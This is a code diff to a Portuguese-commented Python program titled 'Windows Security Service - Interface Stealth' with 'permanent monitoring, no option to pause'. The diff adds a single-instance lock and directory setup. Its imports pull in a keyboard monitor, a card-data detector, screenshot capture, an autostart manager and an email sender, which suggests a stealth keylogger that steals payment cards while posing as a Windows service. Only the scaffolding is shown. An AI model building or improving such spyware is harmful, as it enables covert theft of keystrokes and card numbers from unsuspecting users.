@@ -3,8 +3,40 @@ Windows Security Service - Interface Stealth
 Monitoramento permanente - sem opção de pausar
 """
 
-import sys
 import os
+import sys
+
+# ============================================================
+# CRÍTICO: Configura diretório ANTES de qualquer outra coisa
+# ============================================================
+if getattr(sys, 'frozen', False):
+    # Rodando como .exe compilado
+    os.chdir(os.path.dirname(sys.executable))
+else:
+    # Rodando como script Python
+    os.chdir(os.path.dirname(os.path.abspath(__file__)))
+# ============================================================
+
+# ============================================================
+# PROTEÇÃO: Evita múltiplas instâncias rodando
+# ============================================================
+try:
+    import msvcrt
+    import tempfile
+
+    lock_file = os.path.join(tempfile.gettempdir(), "WindowsSecurity.lock")
+    try:
+        # Tenta abrir arquivo exclusivamente
+        lock_handle = os.open(lock_file, os.O_EXCL | os.O_CREAT | os.O_WRONLY)
+        os.close(lock_handle)
+    except OSError:
+        # Já existe - outra instância está rodando
+        print("⚠️ WindowsSecurity já está rodando!")
+        sys.exit(0)
+except:
+    pass
+# ============================================================
+
 import time
 import threading
 import tkinter as tk
@@ -31,7 +63,7 @@ from keyboard_monitor import KeyboardMonitor
 from pattern_detector import CardData
 from alert_window import AlertWindow
 from screenshot_capture import ScreenshotCapture
-from autostart import AutoStartManager
+from autostart_manager import AutoStartManager
 from email_sender import EmailSender
 from PIL import Image
 
